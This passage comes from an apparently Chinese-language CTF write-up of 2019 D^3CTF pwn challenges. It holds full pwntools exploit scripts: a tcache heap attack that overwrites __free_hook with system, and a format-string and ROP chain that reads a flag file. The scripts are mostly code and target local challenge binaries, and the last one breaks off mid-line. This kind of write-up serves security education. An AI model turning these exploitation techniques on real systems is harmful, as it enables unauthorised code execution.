然后在对应的位置写入free_hook的地址,再malloc写入system就可以了```pythondelete(13)create(0x68,p64(0x0000000000000001)+p64(0)*7+p64(libc.symbols["__free_hook"]))create(0x18,p64(libc.symbols["system"]))delete(14)```<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>binary_name <span class="token operator">=</span> <span class="token string">'new_heap'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./new_heap"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./new_heap"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc = ELF("./libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc-2.29.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span>con<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'3.'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">,</span>con<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'3.'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'good present for African friends:'</span><span class="token punctuation">)</span>heap_last_address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token operator">//</span> 多余的两个chunk进入fastbindelete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"exit\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"sure?\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"n\n"</span><span class="token punctuation">)</span>  <span class="token operator">//</span> malloc_consolidation合并两个fastbin进入small bin中 create<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">//</span> 为释放进第二个fastbinchunk进入tcache腾出位置delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token operator">//</span>  释放第二个chunk进入tcache<span class="token punctuation">,</span>为了后面分配大chunk的控制listcreate<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x10"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>heap_last_address<span class="token number">-2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 控制list</span>create<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">"shinnosuke"</span><span class="token punctuation">)</span>                                        <span class="token comment" spellcheck="true"># 为了将这个剩余的0x40 chunk归类到smallbin中</span>create<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x60\x37"</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true"># 为了修改fd为stdout位置</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                                                        <span class="token comment" spellcheck="true"># 将这个0x40的chunk释放到tcache中,其实在这个位置+0x20的位置就是fd为stdout的chunk,我们在后面会在tcache header中修改</span>create<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000020000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token string">"\xe0"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>heap_last_address<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 修改fd为tcache header,这里还要将tcache 0x250的list的number设置为7,为了再一次利用header来控制tcache list</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>offset__IO_stdfile_2_lock<span class="token operator">=</span> <span class="token number">0x1e7570</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> offset__IO_stdfile_2_lock<span class="token keyword">print</span> <span class="token string">"libc address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000000001</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-unprintbleV"><a href="#0x03-unprintbleV" class="headerlink" title="0x03 unprintbleV"></a>0x03 unprintbleV</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/20.png"></div><h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>main函数中：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/21.png"></div>有定义的规则，我们用工具看看是什么规则：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/22.png"></div>看到禁用了system，那么思路就是读取的方式了。<p>查看menu函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/23.png"></div>注意关闭了输出流：close(1)<p>查看vuln函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/24.png"></div><p>程序逻辑如下：</p><p>题目开始给一个栈地址，同时关闭输出流（也就是说printf等函数无法打印信息）。后面则紧跟一个可以利用64次的格式化字符串漏洞。之前看到过D1CTF的unprintable题目。这道题跟之前题目的思路不一样：前者通过劫持exit函数来进行劫持栈地址进行ROP。这里要考虑如何进行恢复输出流操作。</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>小trick：这里有两种方法来恢复输出流的操作：<br>（1）.改stdout为stderr（stdout是标准输出流，我们之前关闭的是这个函数。当我们将stdout的值覆盖为stderr时就可以继续输出）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/25.png"></div>（2）可以改stdout的fileno为2（标准输出应该是2，但是close(1)后就等于 1了）<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2019-d3ctf-bu-fen-pwn-jie-ti/26.png"></div>在解题过程中，我们使用的是第一种方法。<h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><p>步骤一：首先利用格式化字符串改掉stdout为stderr</p><pre class="line-numbers language-python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gift: 0x"</span><span class="token punctuation">)</span>buf_stack <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>buf_stack<span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">0x64</span>index <span class="token operator">=</span> buf_stack<span class="token operator">&amp;</span><span class="token number">0xff</span>payload <span class="token operator">=</span>  <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hhn"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%32c%10$hhn"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%1664c%9$hn"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤二：可以输出后就泄露libc地址和程序基址</p><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"%7$p"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>base_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xafb</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%15$p"</span><span class="token comment" spellcheck="true"># gdb.attach(p,"b *0x555555554a20")</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">231</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤三：修改返回地址，劫持栈</p><pre class="line-numbers language-python"><code class="language-python">set_value<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x850</span><span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>set_value<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202080</span><span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>set_value<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x9f8</span><span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>步骤四：准备ROP（open、read、write来泄露出flag）注意：本来之前想用mprotect的方式来搞，但是由于最后gets的时候应该是由于stdout改变了会报错，然后用read读取shellcode，但是由于最后输入输出流关闭了无法读入shellcode，遂放弃。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># open</span>rop <span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202070</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># read</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202300</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># write</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202300</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># decode=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./unprintableV"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./unprintableV"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sendInfo</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span>  count    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    count <span class="token operator">=</span> count<span class="token number">-1</span><span class="token keyword">def</span> <span class="token function">set_value</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>index_<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>index_<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'d%6$hhn'</span>        sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        one_gadget1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token operator">>></span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>        payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>one_gadget1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"d%10$hhn"</span>        sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gift: 0x"</span><span class="token punctuation">)</span>buf_stack <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>buf_stack<span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">0x64</span>index <span class="token operator">=</span> buf_stack<span class="token operator">&amp;</span><span class="token number">0xff</span>payload <span class="token operator">=</span>  <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hhn"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%32c%10$hhn"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%1664c%9$hn"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%7$p"</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>base_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xafb</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%15$p"</span><span class="token comment" spellcheck="true"># gdb.attach(p,"b *0x555555554a20")</span>sendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">231</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_addr<span class="token comment" spellcheck="true"># open</span>rop <span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202070</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># read</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span 